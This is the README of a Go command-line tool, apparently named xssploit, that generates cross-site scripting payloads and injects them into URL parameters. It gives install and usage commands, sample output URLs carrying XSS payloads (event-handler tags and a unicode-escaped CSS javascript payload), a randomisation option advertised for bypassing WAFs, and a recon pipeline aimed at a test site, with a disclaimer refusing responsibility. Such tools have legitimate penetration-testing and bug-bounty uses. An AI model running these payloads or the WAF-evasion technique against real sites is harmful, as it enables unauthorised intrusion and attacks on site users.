is an automated tool designed for generating and injecting Cross-Site Scripting (XSS) payloads into URLs.

## Features

- **Parallel Processing**: Scans multiple URLs simultaneously using goroutines.
- **Custom Payloads**: Supports loading custom XSS payloads from a `.txt` file.
- **Randomization**: Randomly inserts XSS payloads into URLs to bypass WAFs.
- **Output Sorting**: Automatically removes duplicate URLs from the results.
- **Verbose Mode**: Optional flag for detailed output.

## Installation

To install the tool using Go, use the following command:

`go install -v github.com/Vulnpire/xssploit@latest`

Or build from the source:

- Clone the repository:

`git clone https://github.com/Vulnpire/XSSploit`

- Build the tool:

`go build -o xssploit main.go`

- Run the tool:

      » xssploit
      And it will generate a random payload:

      <script onblur="confirm(1)" style="width:17px;">

## Arguments

    -url: Scan a single URL
    -file: Path to a .txt file containing URLs to inject the payloads into. Each URL should be on a new line.
    -number: Number of XSS payloads to generate for each URL.
    -randomization: Specify the number of random payloads to select from the file. This helps in bypassing WAFs by injecting different payloads in each request. E.g: 10

## Usage

» xssploit -number 2 -file urls.txt
    
    http://example.com/?param=<script onclick="alert(1)" style="color:12px;">
    http://example.com/?param=<img onerror="console.log("XSS")" style="height:42px;">
    
    
» xssploit -number 1 -url 'http://example.com/?param=' -patterns ./payloads.txt -randomization 1
    
    http://example.com/?param=%3CDIV+STYLE%3D%22background-image%3A%5C0075%5C0072%5C006C%5C0028%27%5C006a%5C0061%5C0076%5C0061%5C0073%5C0063%5C0072%5C0069%5C0070%5C0074%5C003a%5C0061%5C006c%5C0065%5C0072%5C0074%5C0028.1027%5C0058.1053%5C0053%5C0027%5C0029%27%5C0029%22%3E
    http://example.com/?param=%3Cdiv+ondblclick%3D%22alert%28%22XSS%22%29%22+style%3D%22height%3A44px%3B%22%3E

## Pipe it with other tools

» echo "testphp.vulnweb.com" | waybackurls | gf xss | uro > temp

» xssploit -number 1 -file file -patterns ./example.txt -randomization 1 |  [reflect](http://github.com:443/Vulnpire/reflect)

![image](https://github.com/user-attachments/assets/5f5f6b6a-63e8-4d87-bdd3-065f9031804a)

## Disclaimer

I am not responsible from your actions.
